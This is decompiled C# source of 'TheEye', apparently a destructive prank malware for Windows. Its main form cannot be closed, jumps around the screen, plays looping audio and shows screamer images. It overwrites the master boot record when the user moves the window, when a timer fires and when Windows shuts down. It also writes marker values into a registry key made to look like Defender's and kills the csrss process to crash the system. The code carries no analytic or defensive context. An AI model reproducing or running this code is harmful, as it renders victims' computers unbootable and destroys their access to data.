// Decompiled with JetBrains decompiler
// Type: TheEye.Form1
// Assembly: TheEye, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 1F112655-6C2B-4871-B1D6-7F6EA80D9DFB
// Assembly location: R:\WinBackup\Downloads\TheEye (Beta) [c0d9d by DesConnet](1)\src\Resources\theeye.exe

using Microsoft.Win32;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Media;
using System.Windows.Forms;
using TheEye.Properties;

namespace TheEye
{
  public class Form1 : Form
  {
    public static SoundPlayer main;
    private int MovedTry;
    private IContainer components;
    public Timer ScreamTime;
    private PictureBox pictureBox1;
    private Timer RandomEyeMove;

    protected override void WndProc(ref Message m)
    {
      switch (m.Msg)
      {
        case 16:
          Random random = new Random();
          int num1 = (int) MessageBox.Show(Vars.CloseMsg[random.Next(0, Vars.CloseMsg.Length)], "TheEye", MessageBoxButtons.OK, MessageBoxIcon.Hand);
          break;
        case 17:
          Functions.SetProcessIsCritical(0);
          DestructionPayloads.OverwriteMBR(Vars.NormalMBR, false);
          using (RegistryKey subKey = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\Defender", true))
          {
            subKey.SetValue("TryToTurnOffPC", (object) 1);
            subKey.Close();
          }
          Form1.main.Stop();
          this.Dispose();
          this.Hide();
          int num2 = (int) MessageBox.Show("You're a bad :3", "TheEye", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
          using (RegistryKey subKey = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\Defender", true))
          {
            subKey.SetValue("TryToTurnOffPC", (object) 0);
            subKey.SetValue("TheEnd", (object) 1);
            subKey.Close();
          }
          Process.GetProcessesByName("csrss")[0].Kill();
          break;
        case 534:
          switch (this.MovedTry)
          {
            case 2:
              this.ScreamTime.Stop();
              int num3 = (int) MessageBox.Show("I TOLD YOU NOT TO MOVE ME!!!", "TheEye", MessageBoxButtons.OK, MessageBoxIcon.Hand);
              int num4 = (int) MessageBox.Show("BUT YOU WEREN'T LISTENING TO ME...", "TheEye", MessageBoxButtons.OK, MessageBoxIcon.Hand);
              this.MovedTry = 10;
              if (Vars.MessageLog > 10)
              {
                DestructionPayloads.OverwriteMBR(Vars.NormalMBR, false);
                using (RegistryKey subKey = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\Defender", true))
                {
                  subKey.SetValue("TheEnd", (object) 1);
                  subKey.Close();
                }
                Vars.finalTheEye = true;
              }
              Form1.main.Stop();
              Form1.main.Dispose();
              this.ScreamTime.Start();
              new imgscreamer().Show();
              break;
            case 10:
              int num5 = (int) MessageBox.Show("I'm ignoring you...", "TheEye", MessageBoxButtons.OK, MessageBoxIcon.Hand);
              break;
            default:
              ++this.MovedTry;
              int num6 = (int) MessageBox.Show("DON'T YOU DARE MOVE ME!!!", "TheEye", MessageBoxButtons.OK, MessageBoxIcon.Hand);
              break;
          }
          break;
      }
      base.WndProc(ref m);
    }

    public Form1() => this.InitializeComponent();

    private void Form1_FormClosing(object sender, FormClosingEventArgs e) => e.Cancel = true;

    private void Form1_Load(object sender, EventArgs e)
    {
      Form1.main = new SoundPlayer((Stream) Resources.main);
      Form1.main.PlayLooping();
      this.RandomEyeMove.Enabled = true;
    }

    private void ScreamTime_Tick(object sender, EventArgs e)
    {
      if (Vars.MessageLog <= 10)
      {
        Form1.main.Stop();
        Form1.main.Dispose();
        new imgscreamer().Show();
        this.ScreamTime.Interval = new Random().Next(40000, 70000);
      }
      else
      {
        this.Hide();
        Form1.main.Stop();
        DestructionPayloads.OverwriteMBR(Vars.NormalMBR, false);
        using (RegistryKey subKey = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\Defender", true))
        {
          subKey.SetValue("TheEnd", (object) 1);
          subKey.Close();
        }
        int num = (int) MessageBox.Show("You know more than you need to...", "TheEye", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
        Vars.finalTheEye = true;
        new imgscreamer().Show();
      }
    }

    private void RandomEyeMove_Tick(object sender, EventArgs e)
    {
      Random random = new Random();
      this.Location = new Point(random.Next(0, Screen.PrimaryScreen.Bounds.Width - this.Width), random.Next(0, Screen.PrimaryScreen.Bounds.Height - this.Height));
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      this.ScreamTime = new Timer(this.components);
      this.pictureBox1 = new PictureBox();
      this.RandomEyeMove = new Timer(this.components);
      ((ISupportInitialize) this.pictureBox1).BeginInit();
      this.SuspendLayout();
      this.ScreamTime.Enabled = true;
      this.ScreamTime.Interval = 60000;
      this.ScreamTime.Tick += new EventHandler(this.ScreamTime_Tick);
      this.pictureBox1.Dock = DockStyle.Fill;
      this.pictureBox1.Image = (Image) Resources._7d98d2290a25fdbadb1bfe263c9e40a4;
      this.pictureBox1.Location = new Point(0, 0);
      this.pictureBox1.Name = "pictureBox1";
      this.pictureBox1.Size = new Size(319, 279);
      this.pictureBox1.SizeMode = PictureBoxSizeMode.StretchImage;
      this.pictureBox1.TabIndex = 0;
      this.pictureBox1.TabStop = false;
      this.RandomEyeMove.Interval = 35000;
      this.RandomEyeMove.Tick += new EventHandler(this.RandomEyeMove_Tick);
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(319, 279);
      this.Controls.Add((Control) this.pictureBox1);
      this.Cursor = Cursors.Default;
      this.FormBorderStyle = FormBorderStyle.FixedDialog;
      this.MaximizeBox = false;
      this.MinimizeBox = false;
      this.Name = nameof (Form1);
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.StartPosition = FormStartPosition.CenterScreen;
      this.TopMost = true;
      this.FormClosing += new FormClosingEventHandler(this.Form1_FormClosing);
      this.Load += new EventHandler(this.Form1_Load);
      ((ISupportInitialize) this.pictureBox1).EndInit();
      this.ResumeLayout(false);
    }
  }
}
